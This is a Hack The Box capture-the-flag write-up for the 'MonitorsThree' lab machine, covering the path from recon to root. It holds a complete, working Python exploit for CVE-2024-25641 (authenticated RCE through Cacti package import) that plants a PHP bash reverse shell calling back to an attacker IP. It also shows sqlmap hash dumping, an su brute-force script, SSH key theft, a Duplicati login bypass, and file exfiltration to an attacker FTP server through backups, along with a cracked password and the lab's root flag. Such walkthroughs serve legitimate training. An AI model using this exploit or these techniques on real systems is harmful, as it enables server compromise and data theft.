---
title: MonitorsThree 
published: 2024-04-01
description: "An in-detail writeup on the linux box: MonitorsThree. From boot to root!"
image: "./MonitorsThree.png"
tags: ["htb", "box", "medium", "linux", "reverse-shells", "privilege-escalation"]
category: HackTheBox
draft: false
---

# MonitorsThree 

## Recon

* Discovered several sub domains:
```text
setup 
rpc 
zeta
ibank
helm
mailgateway 
resource  
cacti 
```

* Main focus: `cacti.monitorsthree.htb` 

## Discovering A Vulnerability 

* `nuclei` results:
```bash
❯ ~/go/bin/nuclei -u http://cacti.monitorsthree.htb/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.2.3

                projectdiscovery.io

[WRN] Found 3 templates with runtime error (use -validate flag for further examination)
[INF] Current nuclei version: v3.2.3 (outdated)
[INF] Current nuclei-templates version: v10.0.0 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 255
[INF] Templates loaded for current scan: 8538
[INF] Executing 8537 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1599 (Reduced 1508 Requests)
[INF] Using Interactsh Server: oast.me
[caa-fingerprint] [dns] [info] cacti.monitorsthree.htb
[cookies-without-secure] [http] [info] http://cacti.monitorsthree.htb/cacti/
[tech-detect:nginx] [http] [info] http://cacti.monitorsthree.htb/cacti/
[tech-detect:nginx] [http] [info] http://cacti.monitorsthree.htb/cacti
[tech-detect:nginx] [http] [info] http://cacti.monitorsthree.htb/
[cacti-panel] [http] [info] http://cacti.monitorsthree.htb/cacti/ ["","1.2.26 | (c) 2004-2024 - The Cacti"]
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:permissions-policy] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:clear-site-data] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:referrer-policy] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:strict-transport-security] [http] [info] http://cacti.monitorsthree.htb/cacti/
[http-missing-security-headers:x-content-type-options] [http] [info] http://cacti.monitorsthree.htb/cacti/
[waf-detect:nginxgeneric] [http] [info] http://cacti.monitorsthree.htb/
[INF] Skipped cacti.monitorsthree.htb:80 from target list as found unresponsive 30 times
[ssh-sha1-hmac-algo] [javascript] [info] cacti.monitorsthree.htb:22
[ssh-server-enumeration] [javascript] [info] cacti.monitorsthree.htb:22 ["SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10"]
[ssh-auth-methods] [javascript] [info] cacti.monitorsthree.htb:22 ["["publickey"]"]
```

* The login panel leaked the version of `cacti`: `1.2.26` 
* Discovered a vulnerability in this particular version: [vuln](https://www.rapid7.com/db/modules/exploit/multi/http/cacti_package_import_rce/) 
* `CVE-2024-25641`

## FootHold 

### Exploiting The Vulnerability 

* The vulnerability can only be exploited if the user is authenticated 

#### Finding Password For Login Panel 

* I captured the login request from burp suite of `forgot_password.php`, `login.php` and `reset_password.php`. Saved all the requests to `requests` 

* Run `sqlmap` to dump the database 
```bash
sqlmap -r requests/ --dbms=mysql --technique=B --dbs
```

* The DB revealed hashes, I cracked them using `john` 
* One hash showed me the password: `greencacti2001` 

```
MariaDB [monitorsthree_db]> select * from users  
    -> ;  
+----+-----------+-----------------------------+----------------------------------+-------------------+-----------------------+------------+------------+-----------+  
| id | username  | email                      | password                        | name              | position              | dob        | start_date | salary  
|  2 | admin    | admin@monitorsthree.htb    | 31a181c8372e3afc59dab863430610e8 | Marcus Higgins    | Super User            | 1978-04-25 | 2021-01-12 | 320800.00 |  
|  5 | mwatson  | mwatson@monitorsthree.htb  | c585d01f2eb3e6e1073e92023088a3dd | Michael Watson    | Website Administrator | 1985-02-15 | 2021-05-10 |  75000.00 |  
|  6 | janderson | janderson@monitorsthree.htb | 1e68b6eb86b45f6d92f8f292428f77ac | Jennifer Anderson | Network Engineer      | 1990-07-30 | 2021-06-20 |  68000.00 |  
|  7 | dthompson | dthompson@monitorsthree.htb | 633b683cc128fe244b00f176c8a950f5 | David Thompson    | Database Manager      | 1982-11-23 | 2022-09-15 |  83000.00 |  
```

![](https://i.postimg.cc/c4zkk2DR/cracked-password.png)

#### Getting A Shell 

* Taking `cacti`'s vulnerability to advantage, I crafted an exploit to directly pop up a shell 
```python
import os
import requests
import base64
import gzip
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization
import argparse
import random
import string
import logging

logging.basicConfig(filename='exploit.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
print('''\nCreated by: Trevohack
    \tAutomate the process of exploiting the CVE-2024-25641\n\n''')
parser = argparse.ArgumentParser(
    epilog='''Examples:
            ./exploit.py http://localhost/cacti admin password
            ./exploit.py -p 10.0.0.10 -l 1234 http://localhost/cacti admin password''',
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument('URL', type=str, help='The target Cacti URL')
parser.add_argument('username', type=str, help='Login username')
parser.add_argument('password', type=str, help='Login password')
parser.add_argument('-p', '--payload_ip', type=str, help='IP address for the payload', default='10.10.16.33')
parser.add_argument('-l', '--payload_port', type=str, help='Port for the payload', default='9999')
args = parser.parse_args()

URL = args.URL
username = args.username
password = args.password
payload_ip = args.payload_ip
payload_port = args.payload_port

print('[*] Attempting to log in...')
logging.info("Attempting to log in to %s with username %s", URL, username)

login_path = '/index.php'
s = requests.Session()
r = s.get(URL)

soup = BeautifulSoup(r.text, 'html.parser')
html_parser = soup.find('input', {'name': '__csrf_magic'})
csrf = html_parser.get('value')

data = {
    '__csrf_magic': csrf,
    'action': 'login',
    'login_username': username,
    'login_password': password,
    'remember_me': 'on'
}

r = s.post(URL + login_path, data=data)

if 'Logged in' not in r.text:
    print('[Failed]')
    logging.error("Login failed for user %s", username)
    exit(1)

print('[SUCCESS]')
logging.info("Login successful for user %s", username)

temp_php_file = 'temp_shell.php'
php_shell_script = f"<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/{payload_ip}/{payload_port} 0>&1\"'); ?>"
with open(temp_php_file, 'w') as shell_file:
    shell_file.write(php_shell_script)

print("[*] Temporary PHP shell script created: temp_shell.php")
logging.info("Temporary PHP shell script created: temp_shell.php")

dest_filename = ''.join(random.choices(string.ascii_lowercase, k=16)) + '.php'
print("[*] Creating the gzip...")
xmldata = """<xml>
   <files>
       <file>
           <name>resource/{}</name>
           <data>{}</data>
           <filesignature>{}</filesignature>
       </file>
   </files>
   <publickey>{}</publickey>
   <signature></signature>
</xml>"""

with open(temp_php_file) as data:
    filedata = data.read()

keypair = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)

public_key = keypair.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

filesignature = keypair.sign(
    filedata.encode('utf-8'),
    padding.PKCS1v15(),
    hashes.SHA256()
)

data = xmldata.format(
    dest_filename,
    base64.b64encode(filedata.encode('utf-8')).decode('utf-8'),
    base64.b64encode(filesignature).decode('utf-8'),
    base64.b64encode(public_key).decode('utf-8')
)

signature = keypair.sign(
    data.encode('utf-8'),
    padding.PKCS1v15(),
    hashes.SHA256()
)

final_data = data.replace("<signature></signature>", f"<signature>{base64.b64encode(signature).decode('utf-8')}</signature>")
final_data = final_data.encode('utf-8')

gz_filename = f'{dest_filename}.gz'
with open(gz_filename, 'wb') as poc:
    poc.write(gzip.compress(final_data))

print('[SUCCESS]')
print('GZIP path is', os.path.join(os.getcwd(), gz_filename))
logging.info("GZIP file created at %s", gz_filename)

print('[*] Sending payload...')

import_post1 = '/package_import.php?package_location=0&preview_only=on&remove_orphans=on&replace_svalues=on'
files = {'import_file': open(gz_filename, 'rb')}
data = {
    '__csrf_magic': csrf,
    'trust_signer': 'on',
    'save_component_import': 1,
    'action': 'save'
}

r = s.post(URL + import_post1, data=data, files=files)
logging.info("Upload response: %s", r.text)

import_post2 = '/package_import.php?header=false'
soup = BeautifulSoup(r.text, 'html.parser')
html_parser = soup.find('input', {'title': f'/var/www/html/cacti/resource/{dest_filename}'})
file_id = html_parser.get('id')

data = {
    '__csrf_magic': csrf,
    'trust_signer': 'on',
    'data_source_profile': 1,
    'remove_orphans': 'on',
    'replace_svalues': 'on',
    file_id: 'on',
    'save_component_import': 1,
    'preview_only': '',
    'action': 'save',
}

r = s.post(URL + import_post2, data=data)
print('[SUCCESS]')
logging.info("Payload confirmed with response: %s", r.text)

file_path = f'/resource/{dest_filename}'
print('You will find the payload in', URL + file_path)

option = input('Do you wanna start the payload ?[Y/n]')

if option.lower() == 'y':
    print('Payload is running...')
    r = s.get(URL + file_path)
    logging.info("Payload executed with response: %s", r.text)
else:
    print('Payload execution skipped.')
    logging.info("Payload execution skipped by user.")

os.remove(temp_php_file)
print(f"[INFO] Temporary PHP shell script {temp_php_file} removed.")
logging.info("Temporary PHP shell script %s removed.", temp_php_file)
```

##### Step 1: Crafting the Payload

* To exploit this vulnerability, I create a malicious PHP payload. Instead of using a pre-existing file, I generate a one-liner PHP reverse shell script that will connect back to my machine. The script looks something like this:

```php
<?php exec('/bin/bash -c "bash -i >& /dev/tcp/10.0.0.10/1234 0>&1"'); ?>
```

* This script will allow me to gain a shell on the target server once executed.

##### Step 2: Preparing the Gzip File

* Next, I prepare this PHP script for upload by encoding it within a Gzip archive. I also sign the payload with a cryptographic signature to ensure it appears legitimate to the application. This is crucial for bypassing any integrity checks that might be in place.

##### Step 3: Uploading the Payload

* With the Gzip file ready, I send a `POST` request to the application’s file upload endpoint, including the Gzip file. After the upload, I confirm that the file has been successfully stored on the server. I do this by checking the response and ensuring that the application acknowledges the upload.

##### Step 4: Executing the Payload

* After successfully uploading the malicious payload, I then need to execute it. I send another request to the application to trigger the execution of the uploaded PHP file. If everything goes as planned, this will execute my reverse shell script on the server, opening a connection back to my machine. 

```bash
python3 exploit.py http://cacti.monitorsthree.htb/cacti/ admin greencacti2001
```

* Gives shell as `www-data`:
```bash
❯ nc -nvlp 9999                                                                  
listening on [any] 9999 ...            
connect to [10.10.16.33] from (UNKNOWN) [10.10.11.30] 51088 
bash: cannot set terminal process group (1200): Inappropriate ioctl for device 
bash: no job control in this shell                                                                                            
www-data@monitorsthree:~/html/cacti/resource$
```

## User Access 

* After enumerating the box for hours, I tried brute forcing the password using several tools and scripts. 
* I made a password spray attack script which generates numerical passwords and try them

```bash
#!/bin/bash

for LENGTH in $(seq 1 10); do
	for PASS in $(seq 1 $LENGTH | awk '{printf "%s", $0}'); do
	
		echo "Trying password: $PASS"
		echo $PASS | su marcus -c whoami 2>/dev/null

		if [ $? -eq 0 ]; then
			echo "Successful password: $PASS"
			exit
		fi
	done 
done 
```

* Fortunately, this script found the password of user `marcus`
![](https://i.postimg.cc/sD5TjmsS/password-spray-attack.png)


#### SSH 

* Grab the `id_rsa` key of `marcus` at `/home/marcus/.ssh/id_rsa`
* Give suitable mods to it: `chmod 600 marcus_id_rsa`
* Connect: `ssh -i loot/marcus_id_rsa marcus@monitorsthree.htb` 

#### User Flag 

```bash
cat /home/*/*.txt
```

## Root Access 

* Running `ss -lnpt` I saw that port `8200` was opened locally 
* I used ssh to port forward: 
```bash
❯ ssh -L 8200:127.0.0.1:8200 marcus@10.10.11.30 -i loot/marcus_id_rsa
Last login: Sun Sep 22 02:25:07 2024 from 10.10.16.33
marcus@monitorsthree:~$ 
```

* When visiting `127.0.0.1:8200` it asks for a password. 

### Recon

* Port `8200` seems to run `Duplicati Beta`, a backup solution.
* `Duplicati` offers backup and recovery solutions on site. 
* Unfortunately, a password is required to login to the application.

### Enumerate Password 

#### Database & Login Bypass 

* After searching for ages, `/opt/duplicati/config` got my attention
* I transfered `Duplicati-server.sqlite` to my machine and opened it with `sqlitebrowser` (`sudo apt install sqlitebrowser -y`) 
* The `server-passphrase` on the `option` table, can be used to abuse `noncedpwd` in the JS back end code 
* I put a random password to the field, and captured the request on burp suite. 
* This returned a `SALT` that matches to the one in the database earlier 
* To create a valid `noncedpwd`: `server-passphrase` from DB > from `Base64` > then convert it to `hex` (using `CyberChef`) 
* I opened developer console in browser and executed:  
```javascript
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('value_of_NONCE') + 'value_of_hex_server_passphrase')).toString(CryptoJS.enc.Base64);
```

* I captured login request in burp, and changed password value to the value of `noncedpwd` (convert it to URL). Hence, I was able to login. 


### Method 1

#### Step 1: The Setup

* First things first, I hop onto the `Duplicati` web interface. I click on **"Add backup"** because who doesn’t love creating new tasks? I give it a name "Backup Root File" , and a description like "Backup for sensitive files" because I want to sound professional. No encryption. 

#### Step 2: Destination Unknown

* Now, I need a place to stash my backup. I set the **Destination** to `/source/home/marcus/dest`. It’s like setting up a secret hideout where Marcus will never look! Then, I set the **Target** to `/source/root/root.txt`. That’s right, I’m aiming for the big prize. Marcus won’t know what hit him!

#### Step 3: Save the Day

After filling out all the necessary info, I hit save. I might even throw in a little victory dance because I’m a backup wizard now! I refresh the Duplicati homepage, and there it is—my shiny new backup task, just sitting there, waiting for me to run it.

#### Step 4: The Moment of Truth

I locate my masterpiece on the homepage and click **"Run now."** It's showtime! Duplicati whirs away, backing up `root.txt` and putting it in my secret stash at `/home/marcus/dest`. I’m practically giddy with excitement, like a kid on Christmas morning.

#### Step 5: The Reveal

Once the backup is done, I waltz over to `/home/marcus/dest`. I’m expecting a treasure trove, and lo and behold, there’s a `.zip` file just sitting there, looking all innocent. I can almost hear it whispering, "Open me!"

#### Step 6: The Great Restoration

Now, I want to restore my precious `root.txt` to a more permanent home, so I head over to the **Restore** section. I pick my backup task, feeling like a kid picking their favorite candy. I set the restore destination to `/source/home/marcus/result`. It’s like I’m creating a cozy little corner for my new file.

#### Step 7: The Final Touch

I hit restore, and `Duplicati` does its thing, which is basically magic. I can almost hear confetti falling as I navigate to `/home/marcus/result`. And there it is—my `root.txt` file, sitting pretty like it owns the place. 


### Method 2 

#### Step 1: Setting Up a FTP Server 

* Imagine you’re a digital wizard, ready to conjure up an FTP server with just a flick of your wrist (or a simple command). Open another terminal window on your machine—like opening a portal to another dimension—and paste the following spell:

```bash
python -m pyftpdlib -p 21 -d /home/kali/Documents/ftp --username user123 --password pw123 -w
```

Now, watch as your terminal transforms into a magical FTP server! You should see something like this:

```bash
[I 2024-08-26 10:58:35] concurrency model: async
[I 2024-08-26 10:58:35] masquerade (NAT) address: None
[I 2024-08-26 10:58:35] passive ports: None
[I 2024-08-26 10:58:35] >>> starting FTP server on 0.0.0.0:21, pid=62423 <<<
```

* Congratulations! You’ve just summoned an FTP server that’s as secure as a door with a “Welcome” sign. Anyone can waltz in with the username `user123` and password `pw123`—it’s like an open invitation to a party where everyone’s welcome, including the pizza guy!

#### Step 2: Logging Back into Duplicati

* Now, it’s time to log back into Duplicati. Open your browser and enter the password like you’re entering a secret lair. Once you’re in, you’ll be greeted by the Duplicati homepage—like stepping into a control center for your backup empire.

* Click on **"Add backup"** on the left side. It’s like saying, “Let’s create a new adventure!” Then, select **"Configure a new backup"** and click Next.

#### Step 3: Naming Your Backup

* Give your backup a name—something catchy like “Epic Backup of Awesomeness”—and make sure to choose **NO ENCRYPTION**. You don’t want to be that person who shows up to the party wearing a mask, right? Click Next.

#### Step 4: Destination Tab

* On the **Destination** tab, select **Storage Type: FTP**. Don’t click “Use SSL” because you want this to be as unsecure as possible. Input your machine's IP, port 21, and the user/password combo (`user123`/`pw123`). For the path, just name it `/ftp/`—it’s like saying, “Let’s throw everything in the FTP bin!”

#### Step 5: Test Connection

* Click **"Test Connection."** If everything is set up correctly, you’ll connect successfully. If not, you might want to check if your FTP server is still alive and kicking!

#### Step 6: Configure Source Data for the Backup

* Now, on the **Source Data** tab, navigate to “Computer” and select the folder named “source.” Open the little arrow for the folder named “source” and deselect all folders except for “root” and “home.” It’s like picking your favorite snacks from a buffet—only the best for your backup!

#### Step 7: Schedule the Backup

* On the **Schedule** tab, adjust the next time from 01:00 PM to 01:01 PM for the lulz. Why not? It’s like setting your alarm for one minute later—just for giggles!

#### Step 8: Set Options

* On the **Options** tab, set the remote volume size to 100 MB. Change nothing else because we’re keeping it simple. Click “Save” and feel like a backup genius.

#### Step 9: Run the Backup

* Now, you’ll see your backup on the Duplicati homepage. Just click **"Run"** and watch the magic happen! Wait for the backup to finish, and soon you’ll see those glorious `.zip` files appearing in your FTP folder.

#### Step 10: Unzip All 3 .zip Archives

* In your FTP folder, you’ll find three (or more) `.zip` archives. Unzip them all. Inside, search for a file named `filelist.json` and open it in a text editor.

#### Step 11: Finding the Golden Hash

* Use **Ctrl + F** to search for the string **"root.txt."** You’ll find a corresponding hash attribute that looks something like this:

```json
"hash":"EpNL1zNNp4qK76AKeG5ja6chtIL8Nifx/M2Vv+oagFQ="
```

#### Step 12: Find the Corresponding File

* Now, just find the corresponding file, which in this case is named `EpNL1zNNp4qK76AKeG5ja6chtIL8Nifx/M2Vv+oagFQ=`. It’s like a treasure hunt, but instead of gold, you’re after some juicy data!

#### Step 13: Root

* Now, it’s time to reveal the secrets hidden in that file. Use the `cat` command: 
```bash
cat EpNL1zNNp4qK76AKeG5ja6chtIL8Nifx_M2Vv-oagFQ=
```

* You should see the flag like this pop up:
```bash
09f0875cc894a2fc12dd9e5a241452cb
```

## Pwned! 
